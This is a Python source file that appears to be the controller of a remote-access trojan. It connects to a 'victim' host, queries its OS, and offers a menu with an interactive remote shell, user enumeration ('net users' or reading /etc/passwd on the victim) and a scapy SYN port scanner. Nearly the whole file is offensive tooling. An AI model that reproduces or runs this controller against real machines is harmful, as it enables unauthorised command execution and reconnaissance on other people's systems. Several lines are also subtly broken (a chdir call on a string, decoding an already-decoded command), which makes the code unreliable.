from scapy.layers.inet import IP, TCP
from scapy.all import *
import socket


class Shell:

    def __init__(self):
        self._history = []
        self._command = ""
        self._next_command = True

    def send(self):
        self._history.append(self._command)
        s.send(self._command.encode("utf-8"))

    def receive(self):
        content = s.recv(4096).decode("utf-8")
        if content[2:] == "cd":
            malware_os.chdir(self._command[3:].decode("utf-8"))
        print(content)

    def history(self):
        print("The history of your commands is:")
        print("----------------------")
        for element in self._history:
            print(element)

    def close(self):
        self._next_command = False

    def get_command(self):
        return self._command

    def set_command(self, command):
        self._command = command

    def get_next_command(self):
        return self._next_command

    def set_next_command(self, next_command):
        self._next_command = next_command


class GetInfo:

    def __init__(self, malware_os):
        self._os = malware_os

    def get_users(self):
        if self._os == "Windows":
            return "net users"
        elif self._os == "Linux":
            return "cut -d: -f1 /etc/passwd"

    def screenshot(self):
        pass


class PortScanner:

    def scanner(self):
        address = input("[*] Enter the address to scan: ")
        min_port = input("[*] Enter de minimum port number: ")
        max_port = input("[*] Enter the Maximum port Number: ")
        print("\033[32m[*] Scan started!\033[0m\n")
        t1 = datetime.now()
        for port in range(int(min_port), int(max_port) + 1):
            resp = sr1(IP(dst=address) / TCP(dport=port, flags="S"), verbose=0)
            if TCP in resp:
                if resp[TCP].flags == "SA":
                    print("Port {}".format(port) + " is open")
        t2 = datetime.now()
        final_time = t2 - t1
        print("\n\033[32m[*] Scan finished!\033[0m")
        print("\033[32m[*] Scanning completed in {}\033[0m".format(final_time))


malware_addr = input("[*] Enter the address of the victim: ")
serv_addr = (malware_addr, 12345)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    s.connect(serv_addr)
except socket.error:
    print("\033[31m[!] Unable to connect to the following address: {}\033[0m".format(malware_addr))
    sys.exit(1)
print(s.recv(4096).decode('utf-8'))
s.send("os".encode("utf-8"))
malware_os = s.recv(4096).decode('utf-8')

getinfo = GetInfo(malware_os)
shell = Shell()

print("\n----------------------")
message = input(
    "1. Press 1 to start a Shell\n2. Press 2 to retrieve information of the victim\n3. Press 3 to start the PortScanner.\n4. Type exit to quit\n\nAnswer: ")
print("\n----------------------")
while message != "exit":
    if message == "1":
        shell.set_next_command(True)
        while shell.get_next_command():
            shell._command = input("\033[32mShell: \033[0m")
            while shell.get_command() == "":
                shell.set_command(input("\033[32mShell: \033[0m"))
            if shell.get_command() == "exit":
                shell.close()
            if shell.get_command() == "history":
                shell.history()
            else:
                shell.send()
                shell.receive()
    elif message == "2":
        shell.set_command(getinfo.get_users())
        shell.send()
        shell.receive()
    elif message == "3":
        scan = PortScanner()
        scan.scanner()

    print("\n----------------------")
    message = input(
        "1. Press 1 to start a Shell\n2. Press 2 to retrieve information of the victim\n3. Press 3 to start the PortScanner.\n4.Type exit to quit\n\nAnswer: ")
print("\n----------------------")

s.close()
